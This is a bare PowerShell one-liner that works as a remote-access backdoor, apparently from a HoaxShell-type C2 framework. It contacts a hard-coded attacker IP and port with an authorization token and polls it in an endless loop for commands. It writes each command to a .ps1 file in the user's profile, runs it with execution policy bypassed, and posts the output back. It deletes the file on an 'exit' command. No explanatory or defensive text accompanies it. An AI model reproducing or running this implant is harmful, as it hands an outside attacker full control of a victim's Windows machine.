$s='206.189.179.214:7826';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:\Users\$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
